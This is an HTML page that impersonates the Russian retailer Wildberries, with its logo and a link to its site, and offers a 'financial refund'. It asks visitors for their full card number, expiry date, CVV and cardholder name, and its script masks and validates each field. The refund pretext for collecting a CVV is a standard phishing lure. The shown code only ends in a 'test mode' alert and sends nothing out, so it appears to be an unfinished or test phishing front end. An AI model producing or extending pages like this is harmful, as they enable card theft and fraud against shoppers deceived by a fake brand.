<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Финансовый возврат</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
    }

    header {
      width: 100%;
      background: #9b4dca;
      position: sticky;
      top: 0;
      z-index: 10;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      text-align: center;
    }
    header .logo-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: white;
      text-decoration: none;
      font-size: 26px;
      font-weight: bold;
      padding: 18px;
      cursor: pointer;
    }
    header .logo-link img {
      height: 32px;
      width: 32px;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      animation: fadeIn 1s ease-in-out;
    }

    h2 {
      text-align: center;
      color: #a000c8;
      margin-bottom: 5px;
      font-size: 28px;
      opacity: 0;
      animation: slideDown 1s forwards;
    }

    .subtitle {
      text-align: center;
      font-size: 17px;
      color: #555;
      margin: 0 0 20px 0;
      line-height: 1.5;
      opacity: 0;
      animation: fadeIn 1.5s ease-in-out forwards;
      animation-delay: 0.5s;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
      transition: all 0.3s ease;
    }

    input:focus {
      border-color: #a000c8;
      box-shadow: 0 0 6px rgba(160, 0, 200, 0.4);
      transform: scale(1.02);
    }

    .row {
      display: flex;
      gap: 10px;
      width: 100%;
    }
    .row input {
      flex: 1 1 0;
      box-sizing: border-box;
    }

    button {
      background: #a000c8;
      color: white;
      font-size: 18px;
      border: none;
      cursor: pointer;
      transition: transform 0.15s ease, background 0.3s ease;
    }

    button:hover {
      background: #8a00a8;
      transform: scale(1.05);
    }

    button:active {
      transform: scale(0.95);
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <header>
    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
      <span>WILDBERRIES</span>
    </a>
  </header>

  <div class="container">
    <h2>Финансовый возврат</h2>
    <p class="subtitle">Для получения возврата денежных средств введите данные карты</p>
    <form id="refundForm">
      <input type="tel" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
      
      <div class="row">
        <input type="tel" id="expiry" placeholder="00 / 00" maxlength="7" inputmode="numeric" required>
        <input type="tel" id="cvv" placeholder="000" maxlength="3" inputmode="numeric" required>
      </div>
      
      <input type="text" id="cardName" placeholder="Имя владельца" required>
      
      <button type="submit">Отправить запрос</button>
    </form>
  </div>

  <script>
    const cardInput = document.getElementById('orderNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const form = document.getElementById('refundForm');

    // Маска для номера карты
    cardInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.slice(0,16);
      const parts = value.match(/.{1,4}/g);
      e.target.value = parts ? parts.join(' ') : '';
      if (value.length === 16) expiryInput.focus();
    });

    // Маска для MM / YY
    expiryInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0,4);
      if (value.length > 2) {
        e.target.value = value.slice(0,2) + " / " + value.slice(2);
      } else {
        e.target.value = value;
      }
      if (value.length === 4) cvvInput.focus();
    });

    // Маска для CVV
    cvvInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
    });

    // Валидация формы
    form.addEventListener('submit', (e) => {
      e.preventDefault();

      const cardNumber = cardInput.value.replace(/\s/g, '');
      const expiry = expiryInput.value.replace(/\s/g, '');
      const cvv = cvvInput.value;
      const cardName = document.getElementById('cardName').value.trim();

      // Проверка номера карты
      if (!/^\d{16}$/.test(cardNumber)) {
        alert('Введите корректный номер карты (16 цифр).');
        return;
      }

      // Проверка даты
      if (!/^\d{2}\/\d{2}$/.test(expiry.replace(' ', ''))) {
        alert('Введите срок действия в формате MM/YY.');
        return;
      }
      const [month, year] = expiry.split('/').map(v => parseInt(v, 10));
      const now = new Date();
      const currentMonth = now.getMonth() + 1;
      const currentYear = now.getFullYear() % 100;
      if (month < 1 || month > 12) {
        alert('Месяц должен быть от 01 до 12.');
        return;
      }
      if (year < currentYear || (year === currentYear && month < currentMonth)) {
        alert('Срок действия карты истёк.');
        return;
      }

      // Проверка CVV
      if (!/^\d{3}$/.test(cvv)) {
        alert('Введите корректный CVV (3 цифры).');
        return;
      }

      // Проверка имени
      if (cardName.length < 2) {
        alert('Введите имя владельца.');
        return;
      }

      alert('✅ Все данные введены корректно (тестовый режим)');
    });
  </script>
</body>
</html>
